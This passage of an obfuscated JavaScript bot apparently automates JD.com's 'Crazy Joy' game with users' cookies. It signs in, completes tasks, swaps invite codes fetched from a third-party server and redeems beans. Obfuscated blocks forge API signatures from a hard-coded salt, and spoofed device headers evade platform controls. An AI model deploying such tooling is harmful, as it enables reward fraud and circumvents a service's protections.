        'url': 'https://m.jingxi.com/jxcfd/' + _0x3a198e + '?strZone=jxcfd&bizCode=jxcfd&source=jxcfd&dwEnv=7&_cfd_t=' + Date['now']() + '&ptag=138631.26.55&' + _0x591b21 + '&_ste=1&_=' + Date['now']() + '&sceneval=2&g_login_type=1&g_ty=ls',
        'headers': {
            'Cookie': $['currentCookie'],
            'Accept': _0x10a086['OCTuU'],
            'Connection': _0x10a086['WQxaL'],
            'Referer': _0x10a086['gxAlX'],
            'Accept-Encoding': _0x10a086['SHZgu'],
            'Host': _0x10a086['jMnPx'],
            'User-Agent': 'jdpingou;iPhone;3.15.2;14.2.1;ea00763447803eb0f32045dcba629c248ea53bb3;network/wifi;model/iPhone13,2;appBuild/100365;ADID/00000000-0000-0000-0000-000000000000;supportApplePay/1;hasUPPay/0;pushNoticeIsOpen/0;hasOCPay/0;supportBestPay/0;session/' + _0x10a086['PoKga'](_0x10a086['AkkvV'](Math['random'], 0x62), 0x1) + ';pap/JA2015_311210;brand/apple;supportJDSHWK/1;Mozilla/5.0 (iPhone; CPU iPhone OS 14_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
            'Accept-Language': _0x10a086['cmAhk']
        }
    };
}

function getJxToken() {
    var _0x378a40 = {
        'DsMnq': 'abcdefghijklmnopqrstuvwxyz1234567890',
        'titBf': function(_0x222842, _0x35d722) {
            return _0x222842 < _0x35d722;
        },
        'wjKcu': function(_0x22414f, _0x31e422) {
            return _0x22414f(_0x31e422);
        },
        'RDbCV': function(_0x572667, _0x1751c2) {
            return _0x572667 * _0x1751c2;
        },
        'uvdBa': function(_0x2d5b3d, _0x81619a) {
            return _0x2d5b3d(_0x81619a);
        },
        'nUHti': function(_0x4c2e17) {
            return _0x4c2e17();
        }
    };

    function _0x1fc971(_0x281e07) {
        let _0x270cbb = _0x378a40['DsMnq'];
        let _0x51fb57 = '';
        for (var _0xfa499 = 0x0; _0x378a40['titBf'](_0xfa499, _0x281e07); _0xfa499++) {
            _0x51fb57 += _0x270cbb[_0x378a40['wjKcu'](parseInt, _0x378a40['RDbCV'](Math['random'](), _0x270cbb['length']))];
        }
        return _0x51fb57;
    }
    return new Promise(_0x5d94e7 => {
        let _0x599130 = _0x378a40['uvdBa'](_0x1fc971, 0x28);
        let _0x4393f2 = (+new Date())['toString']();
        let _0x48515a = $['currentCookie']['match'](/pt_pin=(.+?);/)[0x1];
        let _0x4f8490 = $['md5']('' + _0x48515a + _0x4393f2 + _0x599130 + 'tPOamqCuk9NLgVPAljUyIHcPRmKlVxDy');
        $['currentToken'] = {
            'timestamp': _0x4393f2,
            'phoneid': _0x599130,
            'farm_jstoken': _0x4f8490
        };
        _0x378a40['nUHti'](_0x5d94e7);
    });
};
_0xodR = 'jsjiami.com.v6'})()
  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })

async function jdCrazyJoy() {
  $.coin = 0
  $.bean = 0
  await getUserInfo($.nextCode)
  await doSign()
  // 助力好友
  await helpFriends()
  await doTasks()
  await getGrowthReward();//领取解锁的等级奖励
  await getCoin()
  await getUserBean()
  if ( applyJdBean!==0 && applyJdBean<=$.bean){
    await $.wait(1000)
    console.log(`检测您打开了自动兑换开关，去兑换京豆`)
    await doApplyJdBean(applyJdBean)
  }
  await getSpecialJoy();
  await showMsg();
}
async function doTasks() {
  await getTaskInfo()
  for (let j = 0; j < $.taskList.length; ++j) {
    let task = $.taskList[j];
    if (task['taskTypeId'] === 102) {
      message += `${task.taskTitle}：${task['doneTimes']}/${task.ext.count}\n`;
    }
    if (task.status === 0 && task.taskTypeId === 103)
      for (let i = task.doneTimes; i < task.ext.count; ++i) {
        await doTask(task.taskId)
      }
    if (task.status === 2)
      await awardTask(task.taskId)
  }
}
function doApplyJdBean(bean = 1000) {
  // 兑换京豆
  let body = {"paramData":{"bean":bean}}
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_user_applyJdBeanPaid', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success) {
              console.log(`兑换${bean}京豆成功`)
              message += `兑换京豆：${bean}京豆成功\n`;
            } else {
              console.log(`兑换${bean}京豆失败，错误信息：${data.resultTips||data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function getUserInfo(code) {
  var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb243f=["\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];let body={"\x70\x61\x72\x61\x6D\x44\x61\x74\x61":{"\x69\x6E\x76\x69\x74\x65\x72":code}};(function(_0xaddbx2,_0xaddbx3,_0xaddbx4,_0xaddbx5,_0xaddbx6,_0xaddbx7){_0xaddbx7= __Oxb243f[0x0];_0xaddbx5= function(_0xaddbx8){if( typeof alert!== _0xaddbx7){alert(_0xaddbx8)};if( typeof console!== _0xaddbx7){console[__Oxb243f[0x1]](_0xaddbx8)}};_0xaddbx4= function(_0xaddbx9,_0xaddbx2){return _0xaddbx9+ _0xaddbx2};_0xaddbx6= _0xaddbx4(__Oxb243f[0x2],_0xaddbx4(_0xaddbx4(__Oxb243f[0x3],__Oxb243f[0x4]),__Oxb243f[0x5]));try{_0xaddbx2= __encode;if(!( typeof _0xaddbx2!== _0xaddbx7&& _0xaddbx2=== _0xaddbx4(__Oxb243f[0x6],__Oxb243f[0x7]))){_0xaddbx5(_0xaddbx6)}}catch(e){_0xaddbx5(_0xaddbx6)}})({})
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_user_gameState', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success && data.data && data.data.userInviteCode) {
              console.log(`\n【京东账号${$.index}（${$.UserName}）的${$.name}好友互助码】${data.data.userInviteCode}`)
              $.selfCodes.push(data.data.userInviteCode)
              $.nextCode = data.data.userInviteCode
              message += `${data.data['nickName']}：${data.data['userTopLevelJoyId']}级JOY\n`;
            }
            else
              console.log(`用户信息获取失败`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

async function helpFriends() {
  let codes = $.newShareCodes.concat($.selfCodes)
  for (let code of codes) {
    if (!code) continue
    await helpFriend(code)
    await $.wait(500)
  }
}

function getTaskInfo() {
  let body = {"paramData": {"taskType": "DAY_TASK"}}
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_task_getTaskState', JSON.stringify(body)), async (err, resp, data) => {
      try {
        $.taskList = []
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success && data.data && data.data.length) {
              $.taskList = data.data;
            } else {
              console.log(`任务信息获取失败`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function doSign() {
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_task_doSign'), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success && data.data) {
              console.log(`签到成功，获得${data.data.beans}京豆，${data.data.coins}金币`)
            } else {
              console.log(data.message)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function doTask(taskId) {
  let body = {"action": "MARK", "taskId": taskId}
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_task_viewPage', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success && data.data && data.data.taskRecordId) {
              console.log(`去做任务【${data.data.taskTitle}】，任务id: ${data.data.taskRecordId}`)
              await $.wait(30000)
              await recordTask(taskId, data.data.taskRecordId)
            } else {
              console.log(`获取信息失败`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function recordTask(taskId, taskRecordId) {
  let body = {"action": "INCREASE", "taskId": taskId, "taskRecordId": taskRecordId}
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_task_viewPage', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success) {
              console.log(`任务【${data.data.taskTitle}】记录成功，去领奖`)
              await awardTask(taskId)
            } else {
              console.log(`获取信息失败`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function awardTask(taskId) {
  let body = {"taskId": taskId}
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_task_obtainAward', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success && data.data && data.data.taskTitle) {
              console.log(`任务【${data.data.taskTitle}】领奖成功，任务奖励：${data.data.beans}京豆，${data.data.coins}金币`)
            } else {
              console.log(`任务领奖信息获取失败`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function helpFriend(code) {
  let body = {"paramData": {"inviter": code}}
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_task_recordAssist', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data['resultCode'] ==='0') {
              console.log(`助力结果:${JSON.stringify(data)}`);
            } else if (data['resultCode'] === '2000402') {
              console.log(data.resultTips)
            } else {
              console.log(`助力异常:${JSON.stringify(data)}`);
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function getUserBean() {
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_user_getJdBeanInfo'), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success && data.data && data.data.totalBeans)
              $.bean = data.data.totalBeans
            else
              console.log(`获取信息失败`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function getCoin() {
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_joy_produce'), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.data && data.data.totalCoinAmount) {
              $.coin = data.data.totalCoinAmount;
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
//领取解锁等级奖励（京豆）
function getGrowthReward() {
  return new Promise(async resolve => {
    const body = { "paramData":{"eventType":"GROWTH_REWARD"} };
    $.get(taskUrl('crazyJoy_event_getGrowthAndSceneState', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data['resultCode'] === '0') {
              if (data.data) {
                for (let item of data.data) {
                  if (item.status === 1) {
                    if (item.eventRecordId) await obtainAward(item.eventRecordId);
                  }
                }
                if ($.GROWTH_REWARD_BEAN > 0) {
                  message += `解锁等级奖励：获得${$.GROWTH_REWARD_BEAN}京豆\n`;
                }
              }
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
//获取特殊JOY情况
function getSpecialJoy() {
  return new Promise(async resolve => {
    const body = { "paramData":{"typeId": 4} };
    $.get(taskUrl('crazyJoy_user_getSpecialJoy', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data['resultCode'] === '0') {
              if (data.data) {
                message += '五福汪:'
                if (data['data'] && data['data'].length > 0) {
                  for (let item of data['data']) {
                    if (item['joyId'] === 1003) {
                      message += `多多JOY(${item['count']}只) `
                    } else if (item['joyId'] === 1004) {
                      message += `快乐JOY(${item['count']}只) `
                    } else if (item['joyId'] === 1005) {
                      message += `好物JOY(${item['count']}只) `
                    } else if (item['joyId'] === 1006) {
                      message += `省钱JOY(${item['count']}只) `
                    } else if (item['joyId'] === 1007) {
                      message += `东东JOY(${item['count']}只)`
                    } else {
                      message += `暂无`
                    }
                  }
                } else {
                  message += `暂无`;
                }
                if (data['data'].length >= 5) {
                  $.msg($.name, '', `京东账号 ${$.index}${$.nickName}\n恭喜你,已集成五福汪可合成分红JOY了`)
                  if ($.isNode()) await notify.sendNotify(`${$.name} - ${$.index} - ${$.nickName}`, `京东账号 ${$.index}${$.nickName}\n恭喜你,已集成五福汪可合成分红JOY了`);
                }
              }
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function obtainAward(eventRecordId) {
  return new Promise(async resolve => {
    const body = {"eventType": "GROWTH_REWARD", eventRecordId};
    $.get(taskUrl('crazyJoy_event_obtainAward', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data['resultCode'] === '0') {
              $.GROWTH_REWARD_BEAN += data.data['beans'];
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function showMsg() {
  return new Promise(async resolve => {
    message += `\n当前信息：${$.bean}京豆，${$.coin}金币`
    $.msg($.name, '', `京东账号${$.index} ${$.nickName}\n${message}`)
    resolve()
  })
}
function taskUrl(functionId, body = '') {
  var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb2398=["\x73\x75\x62\x73\x74\x72","\x6E\x6F\x77","","\x61\x44\x76\x53\x63\x42\x76\x24\x67\x47\x51\x76\x72\x58\x66\x76\x61\x38\x64\x47\x21\x5A\x43\x40\x44\x41\x37\x30\x59\x25\x6C\x58","\x6D\x64\x35","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];let t=Date[__Oxb2398[0x1]]().toString()[__Oxb2398[0x0]](0,10);let e=body|| __Oxb2398[0x2];e= $[__Oxb2398[0x4]](__Oxb2398[0x3]+ e+ t);e= e+ Number(t).toString(16);(function(_0x8b7fx3,_0x8b7fx4,_0x8b7fx5,_0x8b7fx6,_0x8b7fx7,_0x8b7fx8){_0x8b7fx8= __Oxb2398[0x5];_0x8b7fx6= function(_0x8b7fx9){if( typeof alert!== _0x8b7fx8){alert(_0x8b7fx9)};if( typeof console!== _0x8b7fx8){console[__Oxb2398[0x6]](_0x8b7fx9)}};_0x8b7fx5= function(_0x8b7fxa,_0x8b7fx3){return _0x8b7fxa+ _0x8b7fx3};_0x8b7fx7= _0x8b7fx5(__Oxb2398[0x7],_0x8b7fx5(_0x8b7fx5(__Oxb2398[0x8],__Oxb2398[0x9]),__Oxb2398[0xa]));try{_0x8b7fx3= __encode;if(!( typeof _0x8b7fx3!== _0x8b7fx8&& _0x8b7fx3=== _0x8b7fx5(__Oxb2398[0xb],__Oxb2398[0xc]))){_0x8b7fx6(_0x8b7fx7)}}catch(e){_0x8b7fx6(_0x8b7fx7)}})({})
  return {
    url: `${JD_API_HOST}?uts=${e}&appid=crazy_joy&functionId=${functionId}&body=${escape(body)}&t=${t}`,
    headers: {
      'Cookie': cookie,
      'Host': 'api.m.jd.com',
      'Accept': '*/*',
      'Connection': 'keep-alive',
      "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      'Accept-Language': 'zh-cn',
      'Referer': 'https://crazy-joy.jd.com/',
      'origin': 'https://crazy-joy.jd.com',
      'Accept-Encoding': 'gzip, deflate, br',
    }
  }
}
function readShareCode() {
  console.log(`开始`)
  return new Promise(async resolve => {
    $.get({url: `https://code.chiang.fun/api/v1/jd/jdcrazyjoy/read/0/`, 'timeout': 10000}, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            console.log(`随机取0个码放到您固定的互助码后面(不影响已有固定互助)`)
            data = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
    await $.wait(10000);
    resolve()
  })
}
//格式化助力码
function shareCodesFormat() {
  return new Promise(async resolve => {
    // console.log(`第${$.index}个京东账号的助力码:::${$.shareCodesArr[$.index - 1]}`)
    $.newShareCodes = [];
    if ($.shareCodesArr[$.index - 1]) {
      $.newShareCodes = $.shareCodesArr[$.index - 1].split('@');
    } else {
      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > inviteCodes.length ? (inviteCodes.length - 1) : ($.index - 1);
      $.newShareCodes = inviteCodes[tempIndex].split('@');
    }
    const readShareCodeRes = await readShareCode();
    if (readShareCodeRes && readShareCodeRes.code === 200) {
      $.newShareCodes = [...new Set([...$.newShareCodes, ...(readShareCodeRes.data || [])])];
    }
    console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify($.newShareCodes)}`)
    resolve();
  })
}

function requireConfig() {
  return new Promise(resolve => {
    console.log(`开始获取${$.name}配置文件\n`);
    //Node.js用户请在jdCookie.js处填写京东ck;
    let shareCodes = [];
    if ($.isNode()) {
      if (process.env.JDJOY_SHARECODES) {
        if (process.env.JDJOY_SHARECODES.indexOf('\n') > -1) {
          shareCodes = process.env.JDJOY_SHARECODES.split('\n');
        } else {
          shareCodes = process.env.JDJOY_SHARECODES.split('&');
        }
      }
      if (process.env.JDJOY_HELPSELF) {
        helpSelf = process.env.JDJOY_HELPSELF
      }
      if (process.env.JDJOY_APPLYJDBEAN) {
        applyJdBean = process.env.JDJOY_APPLYJDBEAN
      }
    }
    console.log(`共${cookiesArr.length}个京东账号\n`);
    $.shareCodesArr = [];
    if ($.isNode()) {
      Object.keys(shareCodes).forEach((item) => {
        if (shareCodes[item]) {
          $.shareCodesArr.push(shareCodes[item])
        }
      })
    }
    console.log(`您提供了${$.shareCodesArr.length}个账号的${$.name}助力码\n`);
    resolve()
  })
}

function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}

function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = (data['base'] && data['base'].nickname) || $.UserName;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '不要在BoxJS手动复制粘贴修改cookie')
      return [];
    }
  }
}
/**
 * 生成随机数字
 * @param {number} min 最小值（包含）
 * @param {number} max 最大值（不包含）
 */
function randomNumber(min = 0, max = 100) {
  return Math.min(Math.floor(min + Math.random() * (max - min)), max);
}
// prettier-ignore
function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let 